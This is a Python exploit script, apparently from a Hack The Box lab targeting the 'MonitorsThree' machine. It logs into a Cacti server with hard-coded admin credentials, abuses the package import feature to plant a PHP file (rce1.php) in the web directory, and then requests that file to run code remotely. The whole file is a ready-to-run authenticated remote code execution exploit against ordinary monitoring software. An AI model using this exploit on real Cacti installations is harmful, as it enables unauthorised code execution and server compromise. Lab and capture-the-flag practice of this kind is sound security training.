
import requests
from tkinter import Tk
from tkinter.filedialog import askopenfilename

file_path = "/home/kali/Workspace_Ethical_Hacking/hack_the_box/htb_machines/monitors_three/vuln.xml.gz"
if not file_path:
    print("No file selected.")
    exit()

# Configuration
BASE_URL = "http://cacti.monitorsthree.htb"
UPLOAD_ENDPOINT = "/cacti/package_import.php"
EXECUTE_ENDPOINT = "/cacti/resource/rce1.php"

#step 0: login

session = requests.Session()
session.get(BASE_URL+"/cacti/index.php")
session.post(BASE_URL+"/cacti/index.php", data="__csrf_magic=sid:eba74cad52b70e7f81d3acf0566dad6e1e2781cd%2C1734085312&action=login&login_username=admin&login_password=greencacti2001&remember_me=on")

# Step 1: File upload
with open(file_path, 'rb') as f:
    files = {'import_file': (file_path.split('/')[-1], f, 'application/gzip')}
    response = session.post(f"{BASE_URL}{UPLOAD_ENDPOINT}?package_location=0&preview_only=on&remove_orphans=on&replace_svalues=on", files=files)
    if response.status_code == 200:
        print("File uploaded successfully.")
    else:
        print(f"Upload failed: {response.status_code}")
        exit()

# Step 2: Execute import
payload = {
    "trust_signer": "on",
    "data_source_profile": "1",
    "remove_orphans": "on",
    "replace_svalues": "on",
    "image_format": "3",
    "graph_height": "200",
    "graph_width": "700",
    "chk_file_eyJwYWNrYWdlIjoiVW5rbm93biIsImZpbGVuYW1lIjoiXC90bXBcL3BocFgwbVhPdSIsInBmaWxlIjoiXC92YXJcL3d3d1wvaHRtbFwvY2FjdGlcL3Jlc291cmNlXC9yY2UxLnBocCJ9": "on",
    "save_component_import": "1",
    "preview_only": "",
    "action": "save"
}
response = session.post(f"{BASE_URL}{UPLOAD_ENDPOINT}?header=false", data=payload)
if response.status_code == 200:
    print("Component import executed successfully.")
else:
    print(f"Component import failed: {response.status_code}")
    exit()

# Step 3: Execute the GET requadmin est
response = session.get(f"{BASE_URL}{EXECUTE_ENDPOINT}")
if response.status_code == 200:
    print("Execution completed successfully.")
    print(response.text)
else:
    print(f"Execution failed: {response.status_code}")
